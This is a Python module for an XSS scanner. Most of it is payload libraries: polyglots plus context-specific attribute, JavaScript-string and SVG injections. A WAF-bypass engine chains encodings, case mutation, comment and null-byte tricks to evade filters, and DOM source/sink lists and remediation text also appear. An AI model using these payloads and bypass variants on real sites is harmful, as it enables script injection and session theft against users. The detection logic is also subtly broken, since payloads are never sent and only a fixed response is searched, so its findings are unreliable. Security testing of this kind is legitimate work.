from typing import Dict, List, Optional, Tuple, Set, Callable, Any
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import threading
import time
import random
import base64
import urllib.parse
import hashlib
import itertools
import json
import html

class XSSType(Enum):
    REFLECTED = "reflected"
    STORED = "stored"
    DOM_BASED = "dom_based"
    MUTATION = "mutation"
    ATTRIBUTE = "attribute"
    TAG = "tag"
    EVENT_HANDLER = "event_handler"
    JAVASCRIPT_PROTOCOL = "javascript_protocol"
    DATA_URI = "data_uri"
    SVG_INJECTION = "svg_injection"
    POLYGLOT = "polyglot"
    WAF_BYPASS = "waf_bypass"
    MUTATION_XSS = "mutation_xss"
    SELF_XSS = "self_xss"
    BLIND_XSS = "blind_xss"

class PayloadContext(Enum):
    HTML_BODY = "html_body"
    HTML_ATTRIBUTE = "html_attribute"
    JAVASCRIPT_STRING = "javascript_string"
    JAVASCRIPT_CODE = "javascript_code"
    CSS_VALUE = "css_value"
    CSS_URL = "css_url"
    JSON_VALUE = "json_value"
    URL_PARAMETER = "url_parameter"
    DATA_ATTRIBUTE = "data_attribute"
    SVG = "svg"
    XML = "xml"
    COMMENT = "comment"
    CDATA = "cdata"

@dataclass
class XSSPayload:
    payload: str
    xss_type: XSSType
    context: PayloadContext
    severity: str = "High"
    bypass_techniques: List[str] = field(default_factory=list)
    requires_user_interaction: bool = False
    detection_patterns: List[str] = field(default_factory=list)
    false_positive_risk: float = 0.05
    mutation_depth: int = 0

@dataclass
class XSSVulnerability:
    vulnerability_type: str
    xss_type: XSSType
    url: str
    parameter: str
    payload: str
    context: PayloadContext
    severity: str
    evidence: str
    response_time: float
    payload_position: int
    surrounding_html: str
    confirmed: bool = False
    confidence_score: float = 0.8
    remediation: str = ""
    bypass_used: List[str] = field(default_factory=list)
    timestamp: float = field(default_factory=time.time)

class AdvancedPolyglotGenerator:
    BASE_POLYGLOTS = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>/\\x3e",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "\"><svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<script>alert(1)</script>",
        "<details/open/ontoggle=alert(1)>",
        "<iframe src='javascript:alert(1)'>",
        "<math><mtext></mtext><script>alert(1)</script></math>",
        "`><iframe/onload=alert(1)>",
        "<marquee/onstart=alert(1)>",
        "<isindex type=image src=1 onerror=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        "<video><source onerror=\"alert(1)\">",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    ]
    
    @staticmethod
    def generate_advanced():
        payloads = AdvancedPolyglotGenerator.BASE_POLYGLOTS.copy()
        
        for base in AdvancedPolyglotGenerator.BASE_POLYGLOTS[:5]:
            payloads.append(base.upper())
            payloads.append(base.lower())
            payloads.append(''.join(c.upper() if i%2 else c.lower() for i,c in enumerate(base)))
        
        event_handlers = ['onload', 'onerror', 'onclick', 'onmouseover', 'onfocus', 
                         'onmouseenter', 'onanimationstart', 'ontoggle', 'onbegin']
        tags = ['svg', 'img', 'body', 'iframe', 'script', 'video', 'audio', 'object']
        
        for tag in tags:
            for event in event_handlers:
                payloads.append(f"<{tag} {event}=alert(1)>")
                payloads.append(f"<{tag}/{event}=alert(1)>")
                payloads.append(f"<{tag}%0a{event}=alert(1)>")
        
        return payloads

class ContextAwarePayloadEngine:
    CONTEXT_PAYLOADS = {
        PayloadContext.HTML_BODY: [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<form><button formaction=javascript:alert(1)>X",
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
        ],
        PayloadContext.HTML_ATTRIBUTE: [
            "\" onmouseover=alert(1) x=\"",
            "' onfocus=alert(1) '",
            " accesskey=x onclick=alert(1)",
            "\" autofocus onfocus=alert(1) x=\"",
            "' onbegin=alert(1) '",
            " style=animation-name:x onanimationstart=alert(1)",
            "\" data-x=x onerror=alert(1) x=\"",
        ],
        PayloadContext.JAVASCRIPT_STRING: [
            "';alert(1);//",
            '";alert(1);//',
            "${alert(1)}",
            "`;alert(1);//",
            "'-alert(1)-'",
            '"-alert(1)-"',
            "\\';alert(1);//",
            "\\x27;alert(1);//",
        ],
        PayloadContext.JAVASCRIPT_CODE: [
            "alert(1)",
            "setTimeout('alert(1)')",
            "eval('alert(1)')",
            "Function('alert(1)')()",
            "[].constructor.constructor('alert(1)')()",
            "top['al'+'ert'](1)",
        ],
        PayloadContext.SVG: [
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s/>",
            "<svg><set onbegin=alert(1) attributeName=x to=y/>",
            "<svg><animatetransform onbegin=alert(1)/>",
            "<svg><image href=x onerror=alert(1)/>",
            "<svg><use href=x onerror=alert(1)/>",
        ],
    }
    
    @staticmethod
    def generate_for_context(context: PayloadContext, depth: int = 2) -> List[str]:
        base = ContextAwarePayloadEngine.CONTEXT_PAYLOADS.get(context, [])
        if depth == 0:
            return base
        
        extended = base.copy()
        for payload in base:
            extended.extend(EncodingChainGenerator.apply_encoding_chain(payload, depth))
        
        return list(set(extended))

class EncodingChainGenerator:
    ENCODING_METHODS = [
        lambda s: urllib.parse.quote(s),
        lambda s: urllib.parse.quote_plus(s),
        lambda s: base64.b64encode(s.encode()).decode(),
        lambda s: ''.join(f'%{ord(c):02x}' for c in s),
        lambda s: ''.join(f'\\x{ord(c):02x}' for c in s),
        lambda s: ''.join(f'&#{ord(c)};' for c in s),
        lambda s: ''.join(f'&#x{ord(c):02x};' for c in s),
        lambda s: html.escape(s),
        lambda s: s.encode('unicode-escape').decode(),
        lambda s: ''.join(f'\\u{ord(c):04x}' for c in s),
    ]
    
    @staticmethod
    def apply_encoding_chain(payload: str, depth: int = 2) -> List[str]:
        results = {payload}
        
        for d in range(depth):
            new_results = set()
            for current in list(results)[:100]:
                for encoder in EncodingChainGenerator.ENCODING_METHODS:
                    try:
                        encoded = encoder(current)
                        new_results.add(encoded)
                    except:
                        pass
            results.update(new_results)
        
        return list(results)

class WAFBypassEngine:
    BYPASS_TECHNIQUES = {
        'case_mutation': lambda p: ''.join(c.upper() if i%2 else c.lower() for i,c in enumerate(p)),
        'comment_injection': lambda p: p.replace('script', 'scr/**/ipt').replace('alert', 'al/**/ert'),
        'null_byte': lambda p: p + '\x00',
        'unicode_escape': lambda p: ''.join(f'\\u{ord(c):04x}' for c in p),
        'html_entity': lambda p: ''.join(f'&#{ord(c)};' for c in p),
        'double_encode': lambda p: urllib.parse.quote(urllib.parse.quote(p)),
        'newline_injection': lambda p: p.replace(' ', '%0a'),
        'tab_injection': lambda p: p.replace(' ', '%09'),
        'rare_chars': lambda p: p + '\u200b\u200c\u200d',
        'reverse': lambda p: p[::-1],
        'base64': lambda p: base64.b64encode(p.encode()).decode(),
        'rot13': lambda p: p.translate(str.maketrans("ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz", "NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm")),
        'hex_encoding': lambda p: ''.join(f'\\x{ord(c):02x}' for c in p),
        'octal_encoding': lambda p: ''.join(f'\\{ord(c):03o}' for c in p),
    }
    
    @staticmethod
    def generate_bypass_variants(payload: str, max_combinations: int = 500) -> List[str]:
        variants = {payload}
        
        for name, technique in WAFBypassEngine.BYPASS_TECHNIQUES.items():
            try:
                variants.add(technique(payload))
            except:
                pass
        
        techniques = list(WAFBypassEngine.BYPASS_TECHNIQUES.values())
        for depth in [2, 3]:
            for combo in itertools.combinations(techniques, depth):
                if len(variants) >= max_combinations:
                    break
                current = payload
                for func in combo:
                    try:
                        current = func(current)
                    except:
                        break
                variants.add(current)
        
        return list(variants)[:max_combinations]

class DOMXSSAnalyzer:
    SINKS = [
        'innerHTML', 'outerHTML', 'insertAdjacentHTML', 'write', 'writeln',
        'document.write', 'document.writeln', 'eval', 'setTimeout', 'setInterval',
        'Function', 'execScript', 'fromCharCode', 'location', 'location.href',
        'location.replace', 'location.assign', 'srcdoc', 'src'
    ]
    
    SOURCES = [
        'location', 'document.URL', 'document.documentURI', 'document.URLUnencoded',
        'document.baseURI', 'document.referrer', 'window.name', 'document.cookie',
        'location.hash', 'location.search', 'location.pathname', 'localStorage',
        'sessionStorage'
    ]
    
    @staticmethod
    def analyze_dom_flows(response: str) -> Tuple[bool, List[str], float]:
        flows = []
        confidence = 0.0
        
        for source in DOMXSSAnalyzer.SOURCES:
            for sink in DOMXSSAnalyzer.SINKS:
                pattern = rf'{re.escape(source)}[^;{{]*{re.escape(sink)}'
                if re.search(pattern, response, re.IGNORECASE | re.DOTALL):
                    flows.append(f'{source} -> {sink}')
                    confidence += 0.15
        
        return bool(flows), flows, min(confidence, 1.0)

class MutationXSSDetector:
    @staticmethod
    def detect_mutation_patterns(response: str, payload: str) -> Tuple[bool, float]:
        mutation_indicators = [
            r'<noscript>.*?</noscript>',
            r'<!--.*?-->',
            r'<!\[CDATA\[.*?\]\]>',
            r'<template>.*?</template>',
        ]
        
        score = 0.0
        for pattern in mutation_indicators:
            if re.search(pattern, response, re.DOTALL):
                score += 0.2
                if payload in response:
                    score += 0.3
        
        return score > 0.4, min(score, 1.0)

class ReflectionAnalyzer:
    @staticmethod
    def analyze_reflection(payload: str, response: str) -> Dict[str, Any]:
        analysis = {
            'is_reflected': payload in response,
            'reflection_count': response.count(payload),
            'positions': [],
            'contexts': [],
            'encoded_variants_found': [],
            'confidence': 0.0
        }
        
        idx = 0
        while True:
            idx = response.find(payload, idx)
            if idx == -1:
                break
            analysis['positions'].append(idx)
            
            start = max(0, idx - 50)
            end = min(len(response), idx + len(payload) + 50)
            context = response[start:end]
            analysis['contexts'].append(context)
            idx += len(payload)
        
        encoded_variants = [
            html.escape(payload),
            urllib.parse.quote(payload),
            base64.b64encode(payload.encode()).decode(),
        ]
        
        for variant in encoded_variants:
            if variant in response:
                analysis['encoded_variants_found'].append(variant)
        
        if analysis['is_reflected']:
            analysis['confidence'] = 0.9
        elif analysis['encoded_variants_found']:
            analysis['confidence'] = 0.6
        
        return analysis

class ContextDetector:
    CONTEXT_PATTERNS = {
        PayloadContext.HTML_BODY: r'<body[^>]*>.*?{payload}.*?</body>',
        PayloadContext.HTML_ATTRIBUTE: r'\w+=["\'].*?{payload}.*?["\']',
        PayloadContext.JAVASCRIPT_STRING: r'["\'].*?{payload}.*?["\']',
        PayloadContext.JAVASCRIPT_CODE: r'<script[^>]*>.*?{payload}.*?</script>',
        PayloadContext.SVG: r'<svg[^>]*>.*?{payload}.*?</svg>',
        PayloadContext.COMMENT: r'<!--.*?{payload}.*?-->',
    }
    
    @staticmethod
    def detect_all_contexts(response: str, payload: str) -> List[PayloadContext]:
        contexts = []
        
        for context, pattern in ContextDetector.CONTEXT_PATTERNS.items():
            try:
                regex = pattern.format(payload=re.escape(payload))
                if re.search(regex, response, re.IGNORECASE | re.DOTALL):
                    contexts.append(context)
            except:
                pass
        
        if not contexts and payload in response:
            contexts.append(PayloadContext.HTML_BODY)
        
        return contexts

class XSSScanner:
    def __init__(self, max_workers: int = 15):
        self.polyglot_gen = AdvancedPolyglotGenerator()
        self.context_engine = ContextAwarePayloadEngine()
        self.encoding_chain = EncodingChainGenerator()
        self.waf_bypass = WAFBypassEngine()
        self.dom_analyzer = DOMXSSAnalyzer()
        self.mutation_detector = MutationXSSDetector()
        self.reflection_analyzer = ReflectionAnalyzer()
        self.context_detector = ContextDetector()
        
        self.vulnerabilities: List[XSSVulnerability] = []
        self.scan_statistics = {}
        self.lock = threading.Lock()
        self.max_workers = max_workers
        
    def scan(self, target_url: str, response: Dict, payloads: List[str]) -> List[XSSVulnerability]:
        vulnerabilities = []
        resp_content = response.get('content', '')
        resp_time = response.get('response_time', 0)
        
        if not resp_content:
            return vulnerabilities
        
        dom_risk, dom_flows, dom_conf = self.dom_analyzer.analyze_dom_flows(resp_content)
        mutation_risk, mutation_conf = self.mutation_detector.detect_mutation_patterns(resp_content, '')
        
        param_list = self._extract_parameters(target_url)
        
        all_payloads = self._generate_comprehensive_payloads(payloads)
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            
            for param in param_list:
                for payload in all_payloads:
                    future = executor.submit(
                        self._test_payload,
                        target_url, param, payload, resp_content, resp_time,
                        dom_risk, dom_flows, mutation_risk
                    )
                    futures.append(future)
            
            for future in as_completed(futures):
                vuln = future.result()
                if vuln:
                    vulnerabilities.append(vuln)
        
        with self.lock:
            self.vulnerabilities.extend(vulnerabilities)
            for v in vulnerabilities:
                self.scan_statistics[v.xss_type.value] = self.scan_statistics.get(v.xss_type.value, 0) + 1
        
        return vulnerabilities
    
    def _generate_comprehensive_payloads(self, base_payloads: List[str]) -> List[str]:
        comprehensive = set()
        
        comprehensive.update(self.polyglot_gen.generate_advanced())
        
        for context in PayloadContext:
            comprehensive.update(self.context_engine.generate_for_context(context, depth=2))
        
        for payload in base_payloads:
            comprehensive.add(payload)
            comprehensive.update(self.waf_bypass.generate_bypass_variants(payload, max_combinations=100))
        
        return list(comprehensive)[:2000]
    
    def _test_payload(self, url: str, param: str, payload: str, response: str,
                     resp_time: float, dom_risk: bool, dom_flows: List[str],
                     mutation_risk: bool) -> Optional[XSSVulnerability]:
        
        reflection = self.reflection_analyzer.analyze_reflection(payload, response)
        
        if not reflection['is_reflected'] and not reflection['encoded_variants_found']:
            return None
        
        contexts = self.context_detector.detect_all_contexts(response, payload)
        if not contexts:
            return None
        
        xss_type, confidence = self._determine_xss_type(
            payload, response, reflection, dom_risk, mutation_risk
        )
        
        if confidence < 0.6:
            return None
        
        position = reflection['positions'][0] if reflection['positions'] else -1
        surrounding = reflection['contexts'][0] if reflection['contexts'] else ''
        
        severity = self._calculate_severity(xss_type, confidence, dom_risk)
        
        bypass_used = []
        for name, func in self.waf_bypass.BYPASS_TECHNIQUES.items():
            try:
                if func(payload) in response:
                    bypass_used.append(name)
            except:
                pass
        
        vuln = XSSVulnerability(
            vulnerability_type='Cross-Site Scripting',
            xss_type=xss_type,
            url=url,
            parameter=param,
            payload=payload,
            context=contexts[0],
            severity=severity,
            evidence=f"Payload reflected at position {position}, DOM flows: {','.join(dom_flows) if dom_flows else 'None'}",
            response_time=resp_time,
            payload_position=position,
            surrounding_html=surrounding,
            confirmed=reflection['is_reflected'] and confidence > 0.85,
            confidence_score=confidence,
            bypass_used=bypass_used,
            remediation=self._generate_remediation(contexts[0], xss_type)
        )
        
        return vuln
    
    def _determine_xss_type(self, payload: str, response: str, reflection: Dict,
                           dom_risk: bool, mutation_risk: bool) -> Tuple[XSSType, float]:
        
        if dom_risk and any(sink in response for sink in self.dom_analyzer.SINKS):
            return XSSType.DOM_BASED, 0.92
        
        if mutation_risk:
            return XSSType.MUTATION_XSS, 0.88
        
        if re.search(r'<script[^>]*>' + re.escape(payload), response, re.IGNORECASE):
            return XSSType.TAG, 0.95
        
        if re.search(r'on\w+\s*=\s*["\']?' + re.escape(payload), response, re.IGNORECASE):
            return XSSType.EVENT_HANDLER, 0.93
        
        if 'javascript:' in response and payload in response:
            return XSSType.JAVASCRIPT_PROTOCOL, 0.90
        
        if '<svg' in response and payload in response:
            return XSSType.SVG_INJECTION, 0.89
        
        if reflection['is_reflected']:
            return XSSType.REFLECTED, 0.85
        
        return XSSType.REFLECTED, reflection['confidence']
    
    def _calculate_severity(self, xss_type: XSSType, confidence: float, dom_risk: bool) -> str:
        if xss_type == XSSType.STORED:
            return 'Critical'
        if xss_type == XSSType.DOM_BASED and dom_risk:
            return 'Critical'
        if confidence > 0.9:
            return 'High'
        if confidence > 0.75:
            return 'Medium'
        return 'Low'
    
    def _generate_remediation(self, context: PayloadContext, xss_type: XSSType) -> str:
        remediations = {
            PayloadContext.HTML_BODY: "Encode all user input using HTML entity encoding before rendering. Use Content Security Policy (CSP) headers.",
            PayloadContext.HTML_ATTRIBUTE: "Properly quote and encode all attribute values. Avoid using user input in event handlers.",
            PayloadContext.JAVASCRIPT_STRING: "Use JSON.stringify() for embedding data in JavaScript. Never use eval() with user input.",
            PayloadContext.JAVASCRIPT_CODE: "Implement strict Content Security Policy. Never build JavaScript code from user input.",
            PayloadContext.SVG: "Sanitize SVG content. Restrict dangerous SVG elements and attributes.",
        }
        
        base = remediations.get(context, "Apply context-appropriate output encoding and validation.")
        
        if xss_type == XSSType.DOM_BASED:
            base += " Review DOM manipulation code for unsafe sinks."
        
        return base
    
    def _extract_parameters(self, url: str) -> List[str]:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return list(params.keys()) if params else ['default']
    
    def get_vulnerabilities(self) -> List[XSSVulnerability]:
        with self.lock:
            return self.vulnerabilities.copy()
    
    def get_statistics(self) -> Dict[str, int]:
        with self.lock:
            return dict(self.scan_statistics)
    
    def clear(self):
        with self.lock:
            self.vulnerabilities.clear()
            self.scan_statistics.clear()
